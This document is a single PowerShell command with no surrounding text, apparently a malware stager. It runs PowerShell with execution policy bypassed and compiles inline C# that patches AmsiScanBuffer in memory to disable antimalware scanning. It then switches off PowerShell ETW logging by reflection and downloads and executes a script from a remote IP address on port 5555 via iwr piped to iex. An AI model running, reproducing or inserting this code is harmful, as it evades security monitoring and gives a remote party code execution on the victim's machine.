Start-Process $PSHOME\powershell.exe "powershell.exe -nop -ep bypass Set-Variable -Name id -Value (get-random);Set-Variable -Name Ref -Value ("System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","System.Runtime.InteropServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");Set-Variable -Name Source -Value ("using System;using System.Runtime.InteropServices;namespace Bypass{public class AMSI$id{[DllImport(`"kernel32`")]public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);[DllImport(`"kernel32`")]public static extern IntPtr LoadLibrary(string name);[DllImport(`"kernel32`")]public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);[DllImport(`"Kernel32.dll`", EntryPoint = `"RtlMoveMemory`", SetLastError = false)]static extern void MoveMemory(IntPtr dest, IntPtr src, int size);public static int Disable(){IntPtr TargetDLL = LoadLibrary(`"amsi.dll`");if (TargetDLL == IntPtr.Zero) { return 1; }IntPtr ASBPtr = GetProcAddress(TargetDLL, `"Amsi`" + `"Scan`" + `"Buffer`");if (ASBPtr == IntPtr.Zero) { return 1; }UIntPtr dwSize = (UIntPtr)5;uint Zero = 0;if (!VirtualProtect(ASBPtr, dwSize, 0x40, out Zero)) { return 1; }Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);Marshal.Copy(Patch, 0, unmanagedPointer, 6);MoveMemory(ASBPtr, unmanagedPointer, 6);return 0;}}}");Add-Type -ReferencedAssemblies $Ref -Language CSharp -TypeDefinition $Source;iex "[Bypass.AMSI$id]::Disable() | Out-Null";[Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0);(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://82.64.91.111:5555/download/powershell/')-UseBasicParsing|iex"
